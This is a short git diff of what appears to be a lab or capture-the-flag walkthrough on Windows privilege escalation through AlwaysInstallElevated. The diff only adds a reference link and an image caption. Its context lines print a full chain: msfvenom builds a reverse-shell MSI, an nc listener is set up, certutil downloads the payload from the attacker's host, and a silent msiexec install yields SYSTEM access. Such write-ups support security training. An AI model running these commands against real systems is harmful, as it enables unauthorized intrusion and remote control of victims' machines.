@@ -233,11 +233,11 @@ CALL_SHELL = f"http://{IP}/images/shell.php"
 
 ![always installed](../.res/2022-09-03-20-16-31.png)  
 
-- Let's try this
+- Let's try this. [Here](https://csbygb.gitbook.io/pentips/windows/post-compromise-attack/alwaysinstallelevated#other-way) is a way to exploit the AlwaysInstalledElevated
 - `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.2 lport=5555 -f msi > gabrielle.msi`
 - We set our listener `rlwrap nc -lvp 5555`
 - We serve it with pythom
 - We get it on the target `certutil.exe -urlcache -f http://10.10.14.2/gabrielle.msi gabrielle.msi`
 - `msiexec /i C:\xampp\htdocs\omrs\images\gabrielle.msi /quiet /qn /norestart`
 - We are root!!  
-![](../.res/2022-09-03-20-25-42.png)
+![root shell](../.res/2022-09-03-20-25-42.png)
